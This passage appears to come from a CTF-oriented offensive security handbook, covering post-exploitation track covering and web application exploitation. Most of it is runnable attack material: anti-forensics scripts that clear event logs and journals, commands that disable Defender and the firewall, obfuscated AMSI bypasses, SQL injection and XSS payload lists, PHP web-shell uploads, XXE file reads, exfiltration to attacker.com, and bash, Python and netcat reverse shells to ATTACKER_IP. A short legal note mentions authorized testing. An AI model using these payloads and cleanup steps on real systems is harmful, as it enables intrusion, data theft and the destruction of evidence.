Get-WmiObject -Namespace root\subscription -Class __EventFilter

# Remove specific filter
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='FilterName'" | Remove-WmiObject

# Remove consumers
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='ConsumerName'" | Remove-WmiObject

# Remove bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

#### Timestomping

**Modify File Timestamps**

```powershell
# Using PowerShell
$file = Get-Item C:\path\to\file.exe
$file.CreationTime = "01/01/2020 12:00:00"
$file.LastWriteTime = "01/01/2020 12:00:00"
$file.LastAccessTime = "01/01/2020 12:00:00"

# Copy timestamps from another file
$source = Get-Item C:\Windows\System32\notepad.exe
$target = Get-Item C:\payload.exe
$target.CreationTime = $source.CreationTime
$target.LastWriteTime = $source.LastWriteTime
$target.LastAccessTime = $source.LastAccessTime
```

**Timestomp with SetMace (Metasploit)**

```powershell
# Within Meterpreter session
timestomp C:\\payload.exe -v
timestomp C:\\payload.exe -m "01/01/2020 12:00:00"
timestomp C:\\payload.exe -c "01/01/2020 12:00:00"
timestomp C:\\payload.exe -a "01/01/2020 12:00:00"
timestomp C:\\payload.exe -z "01/01/2020 12:00:00"

# Copy from reference file
timestomp C:\\payload.exe -r C:\\Windows\\System32\\notepad.exe
```

---

### Anti-Forensics Techniques

#### Secure File Deletion

**SDelete (Sysinternals)**

```cmd
# Overwrite file multiple times
sdelete -p 7 C:\path\to\file

# Overwrite free space
sdelete -c C:
sdelete -z C:

# Recursively delete directory
sdelete -r -p 3 C:\path\to\folder
```

**Cipher Command**

```powershell
# Overwrite deleted data on drive
cipher /w:C:\folder

# This overwrites free space with:
# - All zeros (0x00)
# - All 255s (0xFF)
# - Random numbers
```

#### Memory Artifacts

**Clear Page File on Shutdown**

```powershell
# Enable page file clearing
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f

# Verify setting
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown
```

**Hibernation File**

```powershell
# Disable hibernation (deletes hiberfil.sys)
powercfg -h off

# Re-enable if needed
powercfg -h on
```

#### Registry Cleanup Verification

**Check for Common Indicators**

```powershell
# Verify Run keys cleared
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Check UserAssist
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"

# Check AppCompatCache
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"

# Check BAM/DAM
reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
```

---

### Advanced Cleanup Automation

#### Cleanup Script Example

```powershell
# Comprehensive cleanup script
# WARNING: This will remove significant forensic evidence

# Clear event logs
Write-Host "[*] Clearing event logs..."
Get-EventLog -List | ForEach-Object {
    try {
        Clear-EventLog $_.Log -ErrorAction SilentlyContinue
    } catch {}
}

# Clear PowerShell history
Write-Host "[*] Clearing PowerShell history..."
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# Delete prefetch
Write-Host "[*] Clearing prefetch..."
Remove-Item C:\Windows\Prefetch\*.pf -Force -ErrorAction SilentlyContinue

# Clear recent files
Write-Host "[*] Clearing recent files..."
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

# Clear jump lists
Write-Host "[*] Clearing jump lists..."
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue

# Flush DNS cache
Write-Host "[*] Flushing DNS cache..."
ipconfig /flushdns | Out-Null

# Clear ARP cache
Write-Host "[*] Clearing ARP cache..."
arp -d * 2>$null

# Delete temporary files
Write-Host "[*] Clearing temp files..."
Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue

# Clear USN journal
Write-Host "[*] Deleting USN journal..."
fsutil usn deletejournal /d C: 2>$null

# Clear registry artifacts
Write-Host "[*] Clearing registry artifacts..."
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f 2>$null
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f 2>$null

Write-Host "[+] Cleanup complete"
```

#### Selective Log Deletion

[Inference: Targeted log manipulation is less suspicious than clearing all logs]

```powershell
# Delete specific event IDs instead of entire logs
# Example: Remove PowerShell execution events

# Security Event ID 4688 (Process Creation)
wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text

# Clear specific event
$log = 'Security'
$eventIDs = @(4688, 4689)
foreach ($id in $eventIDs) {
    Get-WinEvent -FilterHashtable @{LogName=$log; ID=$id} -ErrorAction SilentlyContinue | 
        ForEach-Object {
            # [Unverified: Direct event deletion may not be possible without clearing entire log]
            # Alternative: Export filtered log, clear original, reimport
        }
}
```

---

### Detection Evasion During Operations

#### Disable Security Tools

**Windows Defender**

```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all monitoring
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Add exclusion path
Add-MpPreference -ExclusionPath "C:\payload"

# Add exclusion process
Add-MpPreference -ExclusionProcess "payload.exe"

# Disable via registry (requires admin + reboot)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Disable via service
sc config WinDefend start= disabled
net stop WinDefend
```

**Disable Windows Firewall**

```powershell
# Disable all profiles
netsh advfirewall set allprofiles state off

# PowerShell method
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Disable specific profile
netsh advfirewall set currentprofile state off
```

**AMSI Bypass**

```powershell
# Common AMSI bypass techniques
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative method
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Obfuscated version
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f'nt.','Automa','ageme','tion.','ls','System.Man','AmsiUti')).GetField(("{1}{0}{2}"-f'i','ams','InitFailed'),[Reflection.BindingFlags]36).GetValue($null),0x41414141)
```

#### Process Hiding Techniques

**Run as Different User**

```powershell
# RunAs command
runas /user:domain\user "cmd.exe"

# PowerShell Start-Process
$cred = Get-Credential
Start-Process cmd.exe -Credential $cred

# Create process with stolen token
# (Requires token manipulation techniques)
```

**Parent PID Spoofing** [Inference: Requires custom code or tools that manipulate STARTUPINFOEX]

```powershell
# Concept: Create process appearing to be child of different parent
# Typically done via C++ or C# with UpdateProcThreadAttribute
# Example using C# compiled at runtime would be required
```

---

### Operational Security Considerations

#### File Transfer Cleanup

**Remove Downloaded Files**

```powershell
# Clear browser cache
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8

# Remove certutil cache
certutil -urlcache * delete

# Clear BITSAdmin downloads
bitsadmin /list /allusers /verbose
bitsadmin /reset /allusers
```

**Network Indicators**

```powershell
# Clear connection tracking
netsh int ip reset
netsh winsock reset

# Remove persistent routes
route print
route delete 0.0.0.0

# Clear NetBIOS sessions
net session /delete
```

#### Account Cleanup

**Remove Created Accounts**

```powershell
# Delete local user
net user backdoor /delete
Remove-LocalUser -Name "backdoor"

# Remove from administrators
net localgroup Administrators backdoor /delete

# Domain account removal (requires Domain Admin)
Remove-ADUser -Identity backdoor -Confirm:$false
```

**Reset Account Activity**

```powershell
# Clear failed logon attempts
net accounts /lockoutthreshold:0

# Reset password history
# [Unverified: Direct password history reset may require domain policy changes]
```

---

### Post-Exploitation Verification

#### Verify Cleanup Success

**Check Remaining Artifacts**

```powershell
# Verify event logs cleared
Get-EventLog -List | Select-Object Log, @{Name='Entries';Expression={$_.Entries.Count}}

# Check for remaining scheduled tasks
schtasks /query | findstr /i "backdoor\|payload\|update"

# Verify services removed
sc query state= all | findstr /i "backdoor\|payload"

# Check registry persistence
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

# Verify WMI persistence removed
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select-Object Name

# Check for remaining files
Get-ChildItem C:\ -Recurse -Include payload.exe,backdoor.exe -ErrorAction SilentlyContinue
```

**Validate Network Cleanup**

```powershell
# Check active connections
netstat -ano | findstr ESTABLISHED

# Verify no persistent connections
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}

# Check for suspicious listening ports
netstat -ano | findstr LISTENING
```

---

### Important Considerations

**Legal and Ethical Boundaries** [Unverified: Legal interpretation varies by jurisdiction]

- Track covering in CTF environments is acceptable and expected
- In authorized penetration tests, document all actions for client reporting
- Unauthorized system modification or evidence destruction may violate laws (e.g., 18 U.S.C. § 1030 in the US)

**Forensic Limitations** [Inference: Based on common forensic recovery techniques]

- Volume Shadow Copies may retain deleted files
- File carving can recover "deleted" data from unallocated space
- Memory dumps may be automatically captured before shutdown
- Network traffic logs exist outside the compromised system
- SIEM systems may have already captured events before local deletion

**Detection Risk** [Inference: Based on common EDR/SIEM behaviors]

- Mass event log deletion is highly suspicious and often alerted
- Clearing all logs simultaneously triggers immediate security alerts
- Disabling security tools generates telemetry before being stopped
- Process injection and AMSI bypasses are widely signatured
- Behavioral analytics detect abnormal cleanup patterns

### Related Topics

**Advanced Persistence**: Bootkit/Rootkit installation, firmware persistence, hypervisor-level persistence **Active Directory Attacks**: Kerberoasting, AS-REP Roasting, DCSync, Golden/Silver tickets, Constrained/Unconstrained delegation **Container Escapes**: Docker/Kubernetes breakouts if Windows containers are in scope **Antivirus Evasion**: Code obfuscation, polymorphic payloads, process hollowing, reflective DLL injection **Memory Forensics**: Understanding what artifacts survive in memory, RAM acquisition techniques

---

## Web Application Exploitation Flow

### Service Enumeration (Ports, Versions, Frameworks)

Service enumeration establishes the attack surface by identifying accessible services, their versions, and underlying technologies. This reconnaissance phase determines vulnerability vectors and appropriate exploitation techniques.

#### Port Discovery and Service Identification

Perform initial port scan to identify listening services:

```bash
# Quick scan of common web ports
nmap -p 80,443,8080,8443,3000,5000,9000 -sV target.com

# Full TCP port scan with service version detection
nmap -p- -sV --script=banner target.com

# UDP port scan (identify less common services)
nmap -sU -sV target.com

# Aggressive scan with OS detection
nmap -A -T4 target.com

# Scan with service fingerprinting
nmap -sV --version-intensity 9 target.com
```

Extract service banners manually for detailed version information:

```bash
# HTTP server banner
curl -I http://target.com

# HTTPS with certificate inspection
openssl s_client -connect target.com:443 -showcerts

# Telnet/SSH banner grabbing
telnet target.com 22
nc -v target.com 22

# FTP banner
nc -v target.com 21
```

Identify web server type and version:

```bash
# Test multiple methods to reveal server
curl -v http://target.com
curl -H "User-Agent: Mozilla" http://target.com
curl -X OPTIONS -v http://target.com

# Check response headers for version leakage
curl -I http://target.com | grep -i "server\|x-powered-by"
```

#### Framework and Technology Detection

Use automated detection tools to identify application frameworks:

```bash
# Whatweb - comprehensive framework detection
whatweb -v http://target.com
whatweb -a 3 http://target.com  # Aggression level 3

# Wappalyzer CLI (if available)
npm install -g wappalyzer
wappalyzer http://target.com

# Manual technology detection via response analysis
curl -s http://target.com | grep -i "generator\|framework\|powered"
```

Identify web framework fingerprints by analyzing HTTP responses and file structure:

```bash
# Check for framework-specific paths
curl -I http://target.com/wp-admin          # WordPress
curl -I http://target.com/joomla           # Joomla
curl -I http://target.com/administrator    # Joomla admin
curl -I http://target.com/phpmyadmin       # PHP management
curl -I http://target.com/admin/           # Common admin path
```

Detect CMS-specific characteristics:

```bash
# WordPress detection and enumeration
wpscan --url http://target.com --enumerate p,t,u

# Drupal detection
drupscan scan --url http://target.com

# Joomla version detection
joomscan --url http://target.com
```

Analyze HTTP response headers for version information:

```bash
# Extract all headers
curl -v http://target.com 2>&1 | grep "^<\|^>"

# Identify custom headers
curl -s -I http://target.com | grep -E "^X-|Server:|Powered-By"

# Check for ASP.NET version
curl -I http://target.com | grep -i "aspnet\|asp.net"
```

#### Directory and Endpoint Enumeration

Discover hidden endpoints and directories:

```bash
# Gobuster for fast directory discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt

# More aggressive with larger wordlist
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.asp,.aspx -t 50

# Include status code filtering
gobuster dir -u http://target.com -w wordlist.txt -s 200,204,301,302,307,401,403

# Enumerate with specific extensions
gobuster dir -u http://target.com -w wordlist.txt -x .php,.js,.json,.xml,.sql

# Burp Suite discovery
# Crawl application through Burp (navigate target in browser with Burp proxy)
# Burp Suite → Crawler → Right-click target → Crawl this branch

# ffuf for flexible fuzzing
ffuf -u http://target.com/FUZZ -w wordlist.txt -c -o results.json

# Recursive directory enumeration
gobuster dir -u http://target.com -w wordlist.txt -r
```

Identify API endpoints:

```bash
# Look for API documentation
curl http://target.com/api
curl http://target.com/api/docs
curl http://target.com/api/swagger.json
curl http://target.com/swagger-ui.html

# Enumerate common API paths
gobuster dir -u http://target.com/api -w /usr/share/wordlists/dirb/common.txt -x .json,.php

# Search for API versioning
gobuster dir -u http://target.com/api -w <(seq 1 10 | sed 's/^/v/' | xargs -I {} echo /v{})
```

[Inference] Map application structure through site crawling and examine robots.txt and sitemap.xml for hidden paths:

```bash
# Extract paths from robots.txt
curl -s http://target.com/robots.txt

# Enumerate from sitemap
curl -s http://target.com/sitemap.xml | grep -oP '(?<=<loc>)[^<]+'

# Check for common admin/backup files
curl -I http://target.com/.htaccess
curl -I http://target.com/web.config
curl -I http://target.com/backup.tar.gz
curl -I http://target.com/.git/config
```

#### JavaScript and Client-Side Analysis

Extract URLs and endpoints from JavaScript files:

```bash
# Find all JavaScript files
curl -s http://target.com | grep -oP 'src=["\047]\K[^"]*\.js'

# Download and analyze for API endpoints
curl -s http://target.com/app.js | grep -oP '(https?://|/)[^\s"]+' | sort | uniq

# Extract endpoints from minified JS
curl -s http://target.com/bundle.js | grep -oP '/api/[^\s"]+' | sort | uniq

# Use Burp Suite or browser developer tools to observe network requests
# Network tab shows all API calls and their parameters
```

Identify hardcoded credentials and API keys:

```bash
# Search JavaScript for sensitive strings
grep -r "password\|api_key\|token\|secret" *.js

# Regex for API key patterns
grep -r "api_key['\"]?\s*[:=]" *.js

# Extract from JavaScript comments
grep -r "//.*password\|/\*.*password" *.js
```

---

### Vulnerability Scanning (Automated + Manual)

Automated vulnerability scanning identifies known weaknesses, while manual testing discovers logic flaws and context-specific vulnerabilities. Combined approach maximizes vulnerability discovery.

#### Automated Web Application Scanning

Deploy comprehensive web application scanners:

```bash
# Nikto - web server scanner
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -C all  # Run all checks

# OWASP ZAP - full web scanning
zaproxy -cmd -quickurl http://target.com -quickout results.html

# Burp Suite Community - automated scan
# Burp Suite → Crawler → Burp Scanner → Active scan

# SQLmap - SQL injection scanning
sqlmap -u "http://target.com/search?q=test" --dbs
sqlmap -u "http://target.com/page?id=1" -p id --dbs

# Acunetix (commercial, but notable)
# Web application vulnerability scanner with advanced features
```

Configure automated scanner for targeted scanning:

```bash
# Limit scan to specific parameters
nikto -h http://target.com -Plugins tests(60)

# Exclude false positives
nikto -h http://target.com -nohtml -noprefixdb

# Generate custom plugin rules
# Nikto plugins directory: /usr/share/nikto/plugins/
```

#### Manual Vulnerability Testing Methodologies

Test for common web vulnerabilities systematically:

**SQL Injection Detection**

```bash
# Basic SQL injection test in URL parameter
curl "http://target.com/search?q=test' OR '1'='1"

# Monitor response for SQL errors
curl -v "http://target.com/search?q=1' AND SLEEP(5)--"

# Time-based blind SQL injection
curl -w "%{time_total}" "http://target.com/page?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"

# Test multiple parameters
for param in id page search user; do
    echo "Testing $param..."
    curl "http://target.com?$param=1' OR '1'='1"
done

# Use sqlmap for comprehensive testing
sqlmap -u "http://target.com/page?id=1" -p id --batch --dbs
sqlmap -u "http://target.com/page?id=1" -p id --current-user --current-db
```

**Cross-Site Scripting (XSS) Detection**

```bash
# Reflected XSS test
curl "http://target.com/search?q=<script>alert('XSS')</script>"

# Stored XSS test (upload/submit content, then retrieve)
curl -X POST "http://target.com/comment" -d "text=<script>alert('XSS')</script>"

# DOM-based XSS (check JavaScript for unsafe sink functions)
# Look for: document.write(), innerHTML, eval(), dangerouslySetInnerHTML

# Test encoding bypasses
curl "http://target.com/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"
curl "http://target.com/search?q=<img src=x onerror=alert('XSS')>"
curl "http://target.com/search?q=<svg onload=alert('XSS')>"

# Burp Suite XSS payload list
# Available in Burp Suite payload repository or custom wordlists
```

**Cross-Site Request Forgery (CSRF) Detection**

```bash
# Identify state-changing operations (POST, PUT, DELETE)
curl -X POST "http://target.com/transfer" -d "amount=1000&to=attacker" -v

# Test if CSRF tokens are present and validated
curl -X POST "http://target.com/transfer" \
  -d "amount=1000&to=attacker" \
  -H "Referer: http://attacker.com"

# Automated CSRF token extraction and replay
# Burp Suite → Options → CSRF Token handling
```

**Authentication and Authorization Testing**

```bash
# Test default credentials
curl -u "admin:admin" http://target.com/admin
curl -u "admin:password" http://target.com/admin

# Test session management
curl -v http://target.com/admin  # Extract session cookie
curl -b "session=SESSIONID" http://target.com/admin

# Test authorization bypass
curl -b "admin=false" http://target.com/admin
curl -H "X-Admin: true" http://target.com/admin
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin

# Brute force user enumeration
for user in admin root test guest; do
    curl -X POST "http://target.com/login" \
      -d "username=$user&password=test" \
      -w "User: $user - HTTP %{http_code}\n" \
      -o /dev/null -s
done
```

**File Upload Vulnerability Testing**

```bash
# Test unrestricted file upload
curl -F "file=@shell.php" http://target.com/upload

# Test mime type bypass
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# Test extension bypass
for ext in .php .php3 .php4 .php5 .phtml .phar .phps; do
    curl -F "file=@shell${ext}" http://target.com/upload
done

# Upload polyglot file (valid image + PHP code)
# Use exiftool to embed PHP in JPEG metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Test directory traversal in upload
curl -F "file=@shell.php" \
  -F "filename=../../../../var/www/html/shell.php" \
  http://target.com/upload
```

**Insecure Direct Object Reference (IDOR) Testing**

```bash
# Sequential ID enumeration
for id in {1..100}; do
    curl -s "http://target.com/api/user/$id" | grep -q "username" && \
    echo "Found user ID: $id"
done

# Enumerate with UUID modification
curl "http://target.com/api/profile?id=550e8400-e29b-41d4-a716-446655440000"
# Modify UUID and test access

# Test parameter tampering
curl "http://target.com/document?doc_id=1&user_id=2"  # Normal
curl "http://target.com/document?doc_id=1&user_id=999"  # Test bypass

# Extract IDs from responses and enumerate
curl -s "http://target.com/api/users" | grep -oP '"id":\K\d+' | while read id; do
    curl -s "http://target.com/api/user/$id" | head -5
done
```

**Information Disclosure Testing**

```bash
# Extract version information
curl -I http://target.com | grep -i "server\|x-powered-by"

# Check for debug information in responses
curl -s http://target.com | grep -i "debug\|stack trace\|error"

# Test error handling
curl "http://target.com/page?id=9999999999"
curl "http://target.com/page?id=test"
curl "http://target.com/page?id='; DROP TABLE users; --"

# Enumerate configuration files
for file in web.config .htaccess config.php settings.ini; do
    curl -s "http://target.com/$file"
done

# Check for backup files
for ext in .bak .backup .old .orig .sql .tar.gz .zip; do
    curl -I "http://target.com/app${ext}"
done
```

#### Manual Testing with Proxy Tools

Intercept and analyze traffic using Burp Suite:

```bash
# Set up proxy interception
# Burp Suite → Proxy → Intercept tab

# Modify requests in flight
# Intercept HTTP request → Modify parameters → Forward

# Repeat requests with modifications
# Right-click request → Send to Repeater
# Modify and resend to test variations

# Identify parameter dependencies
# Send requests with different parameter combinations
# Note which combinations cause errors or different behavior
```

Use browser developer tools for client-side analysis:

```javascript
// Extract form data and CSRF tokens
document.querySelectorAll('input[name="csrf_token"]').forEach(el => console.log(el.value));

// Monitor network requests
// DevTools → Network tab → Observe API calls

// Test endpoint responses
fetch('/api/user/123').then(r => r.json()).then(d => console.log(d));

// Check for hardcoded credentials
console.log(localStorage);
console.log(sessionStorage);
```

---

### Injection Point Identification

Injection vulnerabilities occur when untrusted input is concatenated into commands or queries without proper sanitization. Systematic identification of injection points establishes the foundation for payload crafting.

#### Source Identification and Data Flow Analysis

Map application data flow to identify where user input reaches execution contexts:

```bash
# Analyze HTTP requests for parameter injection points
# Burp Suite → Crawl application → Note all parameters in GET/POST/HEADER

# Test every parameter systematically
curl "http://target.com/search?q=test&sort=name&page=1&category=tech"
# Each parameter (q, sort, page, category) is a potential injection point

# Identify data flow from client to server
# Client input → Server processing → Database query → Output rendering

# Use Burp Suite Scanner to identify injection points automatically
# Burp Suite → Scanner → Active Scan → Identifies parameter handling
```

Test for injection in multiple contexts:

**URL Parameters (Query Strings)**

```bash
# Basic test with special characters
curl "http://target.com/page?id=1' OR '1'='1"
curl "http://target.com/page?id=1; DROP TABLE users; --"
curl "http://target.com/search?q=$(printf '%x' 'test')"

# Monitor for error responses indicating injection
curl -v "http://target.com/page?id=1' AND SLEEP(5)--" -w "\nTime: %{time_total}\n"
```

**POST Data (Form Fields, JSON, XML)**

```bash
# Test POST parameters
curl -X POST "http://target.com/login" \
  -d "username=admin' OR '1'='1&password=test"

# JSON payload injection
curl -X POST "http://target.com/api/user" \
  -H "Content-Type: application/json" \
  -d '{"name":"test\"; DROP TABLE users; --","email":"test@test.com"}'

# XML payload injection
curl -X POST "http://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<data>
  <user>test</user>
  <payload><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]></payload>
</data>'
```

**HTTP Headers**

```bash
# Test injection in User-Agent
curl -H "User-Agent: $(whoami)" http://target.com

# Test injection in X-Forwarded-For
curl -H "X-Forwarded-For: 127.0.0.1' OR '1'='1" http://target.com

# Test injection in Referer
curl -H "Referer: http://target.com/'; DROP TABLE users; --" http://target.com

# Test injection in Cookie
curl -b "session=1' OR '1'='1" http://target.com
```

**File Upload Names and Content**

```bash
# Test filename injection
curl -F "file=@test.txt;filename=test.php' OR '1'='1.jpg" http://target.com/upload

# Test file content injection (polyglot files)
cat > polyglot.jpg << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -F "file=@polyglot.jpg" http://target.com/upload
```

#### Characterization of Injection Behavior

Identify how the application processes injected input:

**Error-Based Injection**

Application returns database or command errors revealing structure:

```bash
# Trigger SQL error to reveal database type
curl "http://target.com/page?id=1' AND 1=CAST((SELECT @@version) AS INT)--"

# Monitor error messages for injection confirmation
curl "http://target.com/page?id=1' AND 1=1--"  # Normal response
curl "http://target.com/page?id=1' AND 1=2--"  # Different response = injection confirmed
```

**Blind/Time-Based Injection**

Application behavior changes based on query execution without displaying errors:

```bash
# Time-based SQL injection
time curl "http://target.com/page?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
# Response delay indicates successful injection

# Boolean-based blind injection
curl "http://target.com/page?id=1' AND '1'='1"  # Normal
curl "http://target.com/page?id=1' AND '1'='2"  # Changed behavior
```

**Out-of-Band Injection**

Data exfiltration through alternative channels (DNS, HTTP callbacks):

```bash
# DNS exfiltration
curl "http://target.com/page?id=1' UNION SELECT LOAD_FILE('\\\\\\attacker.com\\share\\') --"

# HTTP callback (using Burp Collaborator or similar)
curl "http://target.com/page?id=1' AND (SELECT LOAD_FILE('http://attacker.com/callback')) --"
```

#### Specialized Injection Context Detection

**Command Injection Indicators**

```bash
# Test for shell command execution
curl "http://target.com/ping?host=127.0.0.1; whoami"
curl "http://target.com/ping?host=127.0.0.1 | whoami"
curl "http://target.com/ping?host=127.0.0.1 && whoami"
curl "http://target.com/ping?host=$(whoami)"
curl "http://target.com/ping?host=\`whoami\`"

# Monitor for unexpected command output or behavior changes
# Application concatenates user input into system shell commands
```

**Template Injection Indicators (Server-Side Template Injection - SSTI)**

```bash
# Test for template language execution
curl "http://target.com/page?name={{7*7}}"
curl "http://target.com/page?name=${7*7}"
curl "http://target.com/page?name=#{7*7}"

# Template injection testing
curl "http://target.com/page?name={{config}}"  # Flask/Jinja2
curl "http://target.com/page?name=<%= 7*7 %>"  # ERB (Ruby)
curl "http://target.com/page?name={$GLOBALS['_POST']['cmd']}"  # PHP

# Confirm injection by checking response for calculated value (49)
```

**LDAP Injection Indicators**

```bash
# Test LDAP filter injection
curl -X POST "http://target.com/search" \
  -d "query=*)(|(uid=*&password=test"

# LDAP wildcard injection
curl -X POST "http://target.com/search" \
  -d "query=admin*"
```

---

### Payload Crafting and Testing

Payload crafting transforms identified injection points into executable code. Testing validates payload effectiveness and refines delivery methods.

#### SQL Injection Payload Construction

Craft SQL statements that bypass authentication or extract data:

**Authentication Bypass**

```sql
-- Basic OR-based bypass
' OR '1'='1' --
' OR '1'='1
' OR 1=1 --
' OR 1=1 /*
admin' --
admin' #
' OR 'x'='x

-- Comment variations
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*

-- Encoded versions
%27 OR %271%27=%271%27 --
' OR 1=1 %23
```

**Data Extraction via UNION-based Injection**

```sql
-- Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Increase until error occurs

-- Identify data types and extract columns
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3 --
' UNION SELECT database(), user(), version() --
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- Extract sensitive data
' UNION SELECT username, password, email FROM users --
' UNION SELECT user(), database(), version() --
' UNION SELECT @@version, @@datadir, @@version_compile_machine --
```

**Time-Based Blind SQL Injection**

```sql
-- MySQL SLEEP()
' AND SLEEP(5) --
' OR SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
' AND IF(LENGTH(database())>5, SLEEP(5), 0) --

-- MSSQL WAITFOR
' AND WAITFOR DELAY '00:00:05' --
' OR WAITFOR DELAY '00:00:05' --

-- PostgreSQL pg_sleep()
' AND pg_sleep(5) --
' OR pg_sleep(5) --

-- Oracle DBMS_LOCK.SLEEP
' AND DBMS_LOCK.SLEEP(5) --
```

**Boolean-Based Blind SQL Injection**

```sql
-- Extract character by character
' AND SUBSTRING(database(), 1, 1) = 'a' --
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --
' AND (SELECT COUNT(*) FROM users) > 5 --
' AND (SELECT ASCII(SUBSTRING(database(), 1, 1))) > 100 --

-- Faster extraction using binary search
' AND (SELECT ASCII(SUBSTRING(database(), 1, 1))) BETWEEN 97 AND 122 --
```

Utilize sqlmap for advanced SQL injection:

```bash
# Full database extraction
sqlmap -u "http://target.com/page?id=1" -p id --batch --dbs

# Extract specific database
sqlmap -u "http://target.com/page?id=1" -p id -D target_db --tables

# Extract table contents
sqlmap -u "http://target.com/page?id=1" -p id -D target_db -T users --dump

# Extract user credentials
sqlmap -u "http://target.com/page?id=1" -p id --current-db --current-user

# Attempt OS command execution
sqlmap -u "http://target.com/page?id=1" -p id --os-shell

# Read arbitrary files
sqlmap -u "http://target.com/page?id=1" -p id --file-read="/etc/passwd"

# Write files (with UNION-based injection)
sqlmap -u "http://target.com/page?id=1" -p id --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

#### Command Injection Payload Construction

Craft commands that execute system operations:

**Basic Command Execution**

```bash
# Command separator variations
; whoami
; id
; cat /etc/passwd
&& whoami
|| whoami
| whoami
` whoami `
$( whoami )

# Newline-based
%0a whoami
\n whoami
```

**Reverse Shell Payloads**

```bash
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# URL-encoded
bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/PORT%200%3E%261

# Bash with base64 encoding
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE= | base64 -d | bash

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3 reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# nc (netcat) reverse shell
nc -e /bin/bash ATTACKER_IP PORT

# Perl reverse shell
